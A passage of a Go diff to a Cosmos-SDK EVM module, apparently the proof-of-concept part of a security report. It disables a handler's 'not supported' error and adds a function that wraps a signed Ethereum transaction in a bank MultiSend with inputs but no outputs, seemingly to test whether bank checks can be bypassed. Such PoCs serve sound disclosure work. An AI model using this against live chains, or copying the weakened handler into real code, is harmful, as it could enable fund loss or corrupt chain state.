-	return nil, status.Errorf(codes.Unimplemented, "not supported")
+	return nil, nil
 }

 func (k msgServer) UpdateParams(goCtx context.Context, req *types.MsgUpdateParams) (*types.MsgUpdateParamsResponse, error) {
diff --git a/x/evm/keeper/txutils.go b/x/evm/keeper/txutils.go
index 4a4717c..0a3715f 100644
--- a/x/evm/keeper/txutils.go
+++ b/x/evm/keeper/txutils.go

@@ -13,6 +13,7 @@ import (
 	"github.com/cosmos/cosmos-sdk/types/tx/signing"
 	authsigning "github.com/cosmos/cosmos-sdk/x/auth/signing"
 	authtx "github.com/cosmos/cosmos-sdk/x/auth/tx"
+	banktypes "github.com/cosmos/cosmos-sdk/x/bank/types"


 	"github.com/ethereum/go-ethereum/common"
 	"github.com/ethereum/go-ethereum/common/hexutil"
@@ -181,6 +182,129 @@ func (u *TxUtils) ConvertEthereumTxToCosmosTx(ctx context.Context, ethTx *corety
 	return txBuilder.GetTx(), nil
 }


+func (u *TxUtils) CustomConvertEthereumTxToCosmosTx(ctx context.Context, ethTx *coretypes.Transaction) (sdk.Tx, error) {
+	params, err := u.Params.Get(ctx)
+	if err != nil {
+		return nil, err
+	}
+

+	feeDenom := params.FeeDenom
+	decimals, err := u.ERC20Keeper().GetDecimals(ctx, feeDenom)
+	if err != nil {
+		return nil, err
+	}
+
+	gasFeeCap := ethTx.GasFeeCap()
+	if gasFeeCap == nil {
+		gasFeeCap = big.NewInt(0)
+	}
+	gasTipCap := ethTx.GasTipCap()
+	if gasTipCap == nil {
+		gasTipCap = big.NewInt(0)
+	}
+
+	// convert gas fee unit from wei to cosmos fee unit
+	gasLimit := ethTx.Gas()
+	gasFeeAmount := computeGasFeeAmount(gasFeeCap, gasLimit, decimals)
+	feeAmount := sdk.NewCoins(sdk.NewCoin(params.FeeDenom, math.NewIntFromBigInt(gasFeeAmount)))
+
+	// convert value unit from wei to cosmos fee unit
+	value := types.FromEthersUnit(decimals, ethTx.Value())
+
+	// check if the value is correctly converted without dropping any precision
+	if types.ToEthersUint(decimals, value).Cmp(ethTx.Value()) != 0 {
+		return nil, types.ErrInvalidValue.Wrap("failed to convert value to token unit without dropping precision")
+	}
+
+	// signer
+	chainID := sdk.UnwrapSDKContext(ctx).ChainID()
+	ethChainID := types.ConvertCosmosChainIDToEthereumChainID(chainID)
+	signer := coretypes.LatestSignerForChainID(ethChainID)
+
+	// get tx sender
+	ethSender, err := coretypes.Sender(signer, ethTx)
+	if err != nil {
+		return nil, err
+	}
+	// sig bytes
+	v, r, s := ethTx.RawSignatureValues()
+	sigBytes := make([]byte, 65)
+	switch ethTx.Type() {
+	case coretypes.LegacyTxType:
+		sigBytes[64] = byte(new(big.Int).Sub(v, new(big.Int).Add(new(big.Int).Add(ethChainID, ethChainID), big.NewInt(35))).Uint64())
+	case coretypes.AccessListTxType, coretypes.DynamicFeeTxType:
+		sigBytes[64] = byte(v.Uint64())
+	default:
+		return nil, sdkerrors.ErrorInvalidSigner.Wrapf("unsupported tx type: %d", ethTx.Type())
+	}
+
+	copy(sigBytes[32-len(r.Bytes()):32], r.Bytes())
+	copy(sigBytes[64-len(s.Bytes()):64], s.Bytes())
+
+	sigData := &signing.SingleSignatureData{
+		SignMode:  SignMode_SIGN_MODE_ETHEREUM,
+		Signature: sigBytes,
+	}
+
+	// recover pubkey
+	pubKeyBz, err := crypto.Ecrecover(signer.Hash(ethTx).Bytes(), sigBytes)
+	if err != nil {
+		return nil, sdkerrors.ErrorInvalidSigner.Wrapf("failed to recover pubkey: %v", err.Error())
+	}
+
+	// compress pubkey
+	compressedPubKey, err := ethsecp256k1.NewPubKeyFromBytes(pubKeyBz)
+	if err != nil {
+		return nil, sdkerrors.ErrorInvalidSigner.Wrapf("failed to create pubkey: %v", err.Error())
+	}
+
+	// construct signature
+	sig := signing.SignatureV2{
+		PubKey:   compressedPubKey,
+		Data:     sigData,
+		Sequence: ethTx.Nonce(),
+	}
+
+	// convert sender to string
+	sender, err := u.ac.BytesToString(ethSender.Bytes())
+	if err != nil {
+		return nil, err
+	}
+
+	sdkMsgs := []sdk.Msg{}
+
+	// add `MultiSend` bank message
+	sdkMsgs = append(sdkMsgs, &banktypes.MsgMultiSend{
+		Inputs: []banktypes.Input{
+			{Address: sender, Coins: sdk.NewCoins(sdk.NewCoin(feeDenom, math.NewIntFromBigInt(value)))},
+		},
+		Outputs: []banktypes.Output{},
+	})
+
+	txBuilder := authtx.NewTxConfig(u.cdc, authtx.DefaultSignModes).NewTxBuilder()
+	if err = txBuilder.SetMsgs(sdkMsgs...); err != nil {
+		return nil, err
+	}
+	txBuilder.SetFeeAmount(feeAmount)
+	txBuilder.SetGasLimit(gasLimit)
+	if err = txBuilder.SetSignatures(sig); err != nil {
+		return nil, err
+	}
+
+	// set memo
+	memo, err := json.Marshal(metadata{
+		Type:      ethTx.Type(),
+		GasFeeCap: gasFeeCap.String(),
+		GasTipCap: gasTipCap.String(),
+	})
+	if err != nil {
+		return nil, err
+	}
+	txBuilder.SetMemo(string(memo))
+
+	return txBuilder.GetTx(), nil
+}
+
 type metadata struct {
 	Type      uint8  `json:"type"`
 	GasFeeCap string `json:"gas_fee_cap"`

```

</details>
